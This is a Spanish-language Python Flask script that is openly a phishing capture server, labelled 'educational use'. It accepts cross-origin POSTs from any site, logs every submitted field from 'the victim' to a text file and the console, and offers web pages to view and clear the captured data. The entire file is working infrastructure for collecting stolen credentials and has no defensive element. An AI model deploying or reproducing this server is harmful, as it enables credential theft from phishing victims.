
from flask import Flask, request, jsonify
from datetime import datetime
import json
import os

app = Flask(__name__)


log_f = "captured_data.txt"

if not os.path.exists(log_f):
    with open(log_f, 'w') as f:
        f.write("=== LOG DE CAPTURAS ===")
        f.write(f"Iniciado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        f.write("=" * 50 + " ")

#permitir peticiones de cualquier origen
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
    response.headers.add('Access-Control-Allow-Credentials', 'true')
    return response

@app.route('/')
def index():
    return '''
    <h2> Servidor de Captura Activo</h2>
    <p>Esperando datos de la víctima...</p>
    <p><strong>Archivo de log:</strong> captured_data.txt</p>
    <p><a href="/view">Ver datos capturados</a></p>
    <p><a href="/clear">Limpiar datos</a></p>
    '''

@app.route('/view')
def view():
    try:
        with open(log_f, 'r') as f:
            content = f.read()
        return f'<pre style="background:#1e1e1e;color:#d4d4d4;padding:20px;border-radius:10px;font-size:14px;max-height:80vh;overflow:auto;">{content}</pre>'
    except:
        return "No hay datos aún."

@app.route('/clear')
def clear():
    with open(log_f, 'w') as f:
        f.write("LOG REINICIADO ")
        f.write(f"Reiniciado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("=" * 50 + " ")
    return "Datos limpiados. <a href='/'>Volver</a>"

@app.route('/capture', methods=['OPTIONS', 'POST'])
def capture():
    # manejo peticio OPTIONS
    if request.method == 'OPTIONS':
        return '', 200
    
    # process post
    try:
        # Obtener los datos (JSON)
        data = request.get_json()
        
        if not data:
            return jsonify({"error": "No se recibieron datos"}), 400
        
        # añadir timestamp
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # log de utilidad
        with open(log_f, 'a') as f:
            f.write(f"[{timestamp}] NUEVA CAPTURA")
            f.write("-" * 40 + "\n")
            for key, value in data.items():
                f.write(f"{key}: {value}")
            f.write("-" * 40 + "\n")
        
        # show
        print(f"\n[{timestamp}] DATOS CAPTURADOS:")
        for key, value in data.items():
            print(f"  {key}: {value}")
        print("-" * 40)
        
        return jsonify({
            "status": "ok",
            "message": "Datos recibidos correctamente"
        }), 200
        
    except Exception as e:
        print(f"[-] Error: {str(e)}")
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════════════╗
    ║   🕵️ SERVIDOR DE CAPTURA DE PHISHING         ║
    ║   USO EDUCATIVO  -  SPCZINMAKER mvrmx            ║
    ║                                               ║
    ║   Servidor corriendo en: http://0.0.0.0:8081  ║
    ║   Endpoint de captura: /capture               ║
    ║   Ver datos: /view                           ║
    ╚═══════════════════════════════════════════════╝
    """)
    app.run(host='0.0.0.0', port=8081, debug=True)
